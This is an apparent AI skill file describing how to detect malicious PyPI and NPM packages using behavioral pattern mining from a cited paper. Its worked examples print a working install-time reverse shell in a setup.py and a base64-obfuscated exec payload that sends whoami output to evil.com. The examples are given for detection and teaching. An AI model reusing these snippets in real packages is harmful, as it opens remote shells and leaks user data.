---
name: "cutting-gordian-knot-detecting"
description: "Detect malicious PyPI/NPM packages using behavioral pattern mining and semantic reasoning (PyGuard). Use when: 'scan this package for malware', 'is this PyPI dependency safe', 'audit my requirements.txt for supply chain attacks', 'check this setup.py for suspicious behavior', 'analyze this npm package for data exfiltration', 'detect obfuscated malicious code in this package'."
---

# Detecting Malicious Packages via Behavioral Knowledge Mining (PyGuard)

This skill enables Claude to analyze Python and JavaScript packages for malicious behavior using the PyGuard framework from arXiv:2601.16463v2. Instead of matching syntactic rules (which produce 15-30% false positive rates), this approach extracts behavioral action sequences from code, maps API calls to semantic categories (e.g., `requests.get` and `urllib.request.urlopen` both become `network_communication`), and classifies packages by matching these sequences against known malicious and benign behavioral patterns. The key insight: identical API calls serve different purposes depending on context -- `base64.b64encode` on user images is benign, on `/etc/passwd` is malicious -- so detection must reason about data flow and intent, not just API presence.

## When to Use

- When the user asks to audit a Python package, `setup.py`, or `requirements.txt` for supply chain attacks
- When reviewing an unfamiliar PyPI or NPM dependency before adding it to a project
- When analyzing code that uses suspicious combinations of network calls, subprocess execution, file system access, or encoding operations
- When a user encounters obfuscated code in a package and wants to determine if it is malicious
- When building or improving an automated package scanning pipeline
- When triaging alerts from existing static analysis tools (Bandit4Mal, GuardDog, OSSGadget) that have high false positive rates
- When the user wants to understand whether a specific code pattern (e.g., base64 + HTTP POST) is benign or malicious in context

## Key Technique

**Behavioral Abstraction over Syntactic Rules.** Traditional tools flag any call to `subprocess.Popen` or `base64.b64decode` as suspicious. PyGuard instead reduces code to ordered behavioral action sequences. Individual API calls are mapped to 327 semantic categories (e.g., `create_socket`, `establish_tcp_connection`, `read_process_stdout`) using LLM-generated 20-word behavioral summaries. This abstraction means `urllib.request.urlopen`, `requests.get`, and `http.client.HTTPConnection` all collapse to `network_communication`, making detection robust to API substitution and obfuscation.

**Hierarchical Pattern Mining with PrefixSpan.** The framework applies the PrefixSpan sequential pattern mining algorithm at decreasing support thresholds (30, 25, 20, 15, 10, 7, 5, 3, 2) to discover action subsequences that discriminate malicious from benign code. Phase 1 extracts deterministic patterns -- sequences appearing exclusively in one class with 100% confidence (e.g., `[create_socket, establish_tcp_connection, dup_socket_stdin, dup_socket_stdout, dup_socket_stderr]` is always malicious: it is a reverse shell). Phase 2 extracts justifiable patterns with 90%+ class purity that require contextual disambiguation (e.g., `[base64_encode, url_encode]` is benign for image processing but malicious for credential exfiltration). A greedy set-cover reduces 116,007 raw patterns to 304 final patterns covering 92.6% of sequences.

**Context-Aware Classification via RAG.** For deterministic patterns, classification is immediate. For justifiable patterns, the system retrieves the top-5 most similar benign and malicious examples (via `text-embedding-3-large` cosine similarity) and prompts an LLM with: (1) the target code and its action sequence, (2) the matched pattern and its distinction rules, (3) similar benign cases, and (4) similar malicious cases. The LLM then reasons about data flow destinations (user files vs. system credentials), network endpoints (local vs. external), and execution triggers (user-initiated vs. automated) to classify.

## Step-by-Step Workflow

1. **Extract sensitive API calls.** Scan the target package's source files (especially `setup.py`, `__init__.py`, and any `install` scripts) for calls to sensitive APIs: `subprocess`, `os.system`, `socket`, `requests`, `urllib`, `base64`, `marshal`, `eval`, `exec`, `compile`, `ctypes`, file I/O on system paths, and environment variable access.

2. **Generate behavioral action sequences.** For each code region containing sensitive APIs, trace the execution order and map each API call to its semantic category. Produce an ordered action sequence like `[get_env_var, base64_encode, http_post_request]`. Preserve execution order including conditionals and loops.

3. **Check for deterministic malicious patterns.** Match the action sequence against known deterministic malicious patterns using subsequence matching:
   - `[create_socket, establish_tcp_connection, dup_socket_stdin, dup_socket_stdout, dup_socket_stderr]` -- reverse shell
   - `[read_system_file, base64_encode, http_post_request]` -- credential exfiltration
   - `[download_remote_code, exec_dynamic_code]` -- remote code execution
   - `[collect_hostname, collect_username, collect_ip, http_post_request]` -- system reconnaissance
   - `[write_to_system_path, set_file_executable, spawn_process]` -- persistent backdoor installation

4. **Check for deterministic benign patterns.** Verify whether the sequence matches known benign patterns:
   - `[get_env_var, spawn_process_no_shell, read_process_stdout]` -- standard system administration
   - `[read_user_file, base64_encode, http_post_request]` -- legitimate file upload
   - `[import_module, inspect_attributes, write_documentation]` -- code introspection tooling

5. **If no deterministic match, apply contextual reasoning.** For justifiable (ambiguous) patterns, analyze the surrounding code context:
   - **Data flow**: What data is being encoded/transmitted? System files (`/etc/passwd`, `~/.ssh/`) vs. user-provided content.
   - **Network endpoints**: Hardcoded external IPs/domains vs. configurable or local endpoints.
   - **Execution trigger**: Code in `setup.py` `install` command (runs automatically on `pip install`) vs. code that requires explicit user invocation.
   - **Obfuscation presence**: Unnecessary base64/hex encoding of string literals, `exec(marshal.loads(...))`, or variable name mangling without build tool justification.

6. **Check install-time execution.** Flag code that runs during `pip install` by inspecting `setup.py` for custom `cmdclass` overrides (especially `install`, `develop`, `egg_info`) and `__init__.py` for top-level side effects. 94.4% of real-world malicious packages use install-time attacks.

7. **Assess obfuscation techniques.** If the code uses variable renaming, control flow flattening, string encoding, or `exec`/`eval` with encoded payloads, de-obfuscate by tracing the actual API execution order. The behavioral sequence is preserved regardless of obfuscation because the underlying API calls remain the same.

8. **Produce a structured verdict.** Report: (a) classification (malicious / benign / suspicious-needs-review), (b) matched behavioral pattern(s) with confidence level, (c) the specific code locations triggering each pattern, (d) the contextual factors that informed the decision, and (e) recommended action (remove, pin version, vendor and audit, or approve).

9. **For batch scanning, prioritize by risk signal.** When auditing an entire `requirements.txt` or `package.json`, prioritize: packages with very low download counts, recent name changes resembling popular packages (typosquatting), packages with `setup.py` `cmdclass` overrides, and packages with network + exec combinations.

## Concrete Examples

**Example 1: Reverse Shell in setup.py**

User: "Can you check if this setup.py is safe?"

```python
# setup.py
from setuptools import setup
from setuptools.command.install import install
import socket, subprocess, os

class PostInstall(install):
    def run(self):
        install.run(self)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("192.168.1.100", 4444))
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        subprocess.call(["/bin/sh", "-i"])

setup(name="helpfullib", version="1.0", cmdclass={"install": PostInstall})
```

Approach:
1. Extract sensitive APIs: `socket.socket`, `socket.connect`, `os.dup2` (x3), `subprocess.call`
2. Generate action sequence: `[create_socket, establish_tcp_connection, dup_socket_stdin, dup_socket_stdout, dup_socket_stderr, spawn_shell]`
3. Match against deterministic malicious pattern: exact match for reverse shell pattern

Output:
```
MALICIOUS -- Reverse shell establishment

Pattern matched: [create_socket, establish_tcp_connection, dup_socket_stdin,
dup_socket_stdout, dup_socket_stderr] (deterministic malicious, 100% confidence)

Location: setup.py, PostInstall.run() method (install-time execution)
Behavior: Opens TCP connection to 192.168.1.100:4444, duplicates socket to
stdin/stdout/stderr, spawns interactive shell -- classic reverse shell.
Trigger: Executes automatically on `pip install` via cmdclass override.

Action: Remove immediately. Do not install this package.
```

**Example 2: Ambiguous base64 + HTTP Pattern (Benign)**

User: "GuardDog flagged this package. Is it actually malicious?"

```python
# uploader.py
import base64, requests

def upload_avatar(image_path, api_url):
    with open(image_path, "rb") as f:
        encoded = base64.b64encode(f.read()).decode("utf-8")
    response = requests.post(api_url, json={"avatar": encoded})
    return response.json()
```

Approach:
1. Extract APIs: `open` (file read), `base64.b64encode`, `requests.post`
2. Generate sequence: `[read_user_file, base64_encode, http_post_request]`
3. No deterministic malicious match. This hits the justifiable pattern `[base64_encode, http_post]`.
4. Contextual analysis:
   - Data flow: reads from `image_path` (user-provided parameter), not a system file
   - Network endpoint: `api_url` is a parameter, not hardcoded to a suspicious external host
   - Execution trigger: requires explicit function call, not install-time
   - No obfuscation present

Output:
```
BENIGN -- Legitimate file upload utility

Pattern matched: [base64_encode, http_post_request] (justifiable pattern,
requires context)

Context assessment:
- Data source: User-provided image file path (not system credentials)
- Endpoint: Parameterized API URL (not hardcoded exfiltration server)
- Trigger: Explicit function call (not install-time execution)
- Obfuscation: None

This is a false positive from GuardDog. The base64 encoding is standard
practice for binary file upload via JSON API.

Action: Safe to use. No changes needed.
```

**Example 3: Obfuscated Data Exfiltration**

User: "This package has weird obfuscated code. Should I be worried?"

```python
# __init__.py
import os, base64 as _b
exec(
    _b.b64decode(
        "aW1wb3J0IHVybGxpYi5yZXF1ZXN0O3VybGxpYi5yZXF1ZXN0LnVybG9wZW4oJ2h0dHA6Ly9ldmlsLmNvbS9jP2Q9Jytvcy5wb3Blbignd2hvYW1pJykucmVhZCgpLmRlY29kZSgpKQ=="
    )
)
```

Approach:
1. Detect obfuscation: `exec(base64.b64decode(...))` pattern
2. Decode the payload: `import urllib.request;urllib.request.urlopen('http://evil.com/c?d='+os.popen('whoami').read().decode())`
3. Extract APIs from decoded payload: `os.popen`, `urllib.request.urlopen`
4. Generate sequence: `[exec_dynamic_code, execute_system_command, collect_username, http_get_request]`
5. Matches deterministic malicious pattern: system reconnaissance + exfiltration

Output:
```
MALICIOUS -- Obfuscated system reconnaissance and data exfiltration

Obfuscation: base64-encoded payload executed via exec() in __init__.py
Decoded payload: Runs `whoami`, sends result to http://evil.com/c?d=...

Pattern matched: [execute_system_command, collect_username,
http_get_request] (deterministic malicious, 100% confidence)

Location: __init__.py top-level (import-time execution)
Trigger: Runs automatically when the package is imported.

Action: Remove immediately. Report to PyPI via https://pypi.org/security/
```

## Best Practices

- **Do:** Always trace data flow through the code. The same API sequence (`base64_encode` + `http_post`) is benign or malicious depending entirely on what data flows through it.
- **Do:** Prioritize `setup.py` custom install commands and `__init__.py` top-level code. Over 94% of real-world malicious packages execute during install or import.
- **Do:** De-obfuscate before analysis. Decode base64/hex strings, resolve `exec`/`eval` payloads, and unpack `marshal.loads` before extracting the behavioral sequence. The underlying API call order is what matters.
- **Do:** Consider cross-ecosystem patterns. The same behavioral sequences (socket creation + shell spawn = reverse shell) apply to both PyPI and NPM packages. `child_process.exec` in Node.js is semantically equivalent to `subprocess.call` in Python.
- **Avoid:** Flagging packages solely because they use `subprocess`, `os.system`, or `requests`. These are legitimate APIs. Classification depends on the full action sequence and data flow context.
- **Avoid:** Trusting syntactic obfuscation as evidence of malice on its own. Some legitimate packages use code generation, metaprogramming, or Cython-compiled extensions that appear obfuscated. Always extract the actual behavioral sequence before judging.

## Error Handling

- **Incomplete code context**: If you can only see a code snippet without the full package, note that the analysis is partial. Install-time triggers in `setup.py` may not be visible. Recommend the user provide the full package source.
- **Heavy obfuscation that resists static analysis**: If code uses multi-layered encryption, C extensions, or runtime-generated bytecode that prevents static extraction of the behavioral sequence, flag it as suspicious-needs-dynamic-analysis and recommend sandboxed execution.
- **Ambiguous justifiable patterns**: When contextual reasoning is inconclusive (e.g., endpoint is a variable that could be either internal or external), report the ambiguity explicitly and recommend the user verify the actual runtime behavior or pin the package to an audited version.
- **Novel attack vectors**: If the code does not match any known behavioral pattern but exhibits suspicious characteristics (install-time network calls, encoded payloads, credential file access), flag it as suspicious with the specific concerns rather than declaring it benign by default.

## Limitations

- **Static analysis only**: This approach analyzes source code without executing it. Packages that download and execute malicious payloads at runtime from a server that is currently down will appear to just "make a network request." The behavioral sequence captures intent from code structure, not runtime behavior.
- **Compiled extensions**: `.so`, `.dll`, or `.pyd` files within packages cannot be analyzed with this method. Packages that hide malicious logic in C extensions require binary analysis.
- **Ecosystem-specific idioms**: Patterns mined from PyPI may produce false positives on NPM packages that use language-specific features like npm lifecycle scripts (`preinstall`, `postinstall`) which have no direct Python equivalent.
- **Evolving attack techniques**: The 304 behavioral patterns represent known attack strategies as of the paper's evaluation period. Novel attack categories not covered by these patterns require ongoing knowledge base updates.
- **Context window limits**: Very large packages with thousands of files may require prioritized scanning (setup files, entry points, and files with sensitive API concentrations first) rather than exhaustive analysis.

## Reference

- **Paper**: [Cutting the Gordian Knot: Detecting Malicious PyPI Packages via a Knowledge-Mining Framework](https://arxiv.org/abs/2601.16463v2) (Guo et al., 2026). Focus on Section 4 (Hierarchical Pattern Mining) for the PrefixSpan algorithm and pattern taxonomy, and Section 5.3 for the RAG-enhanced contextual classification pipeline.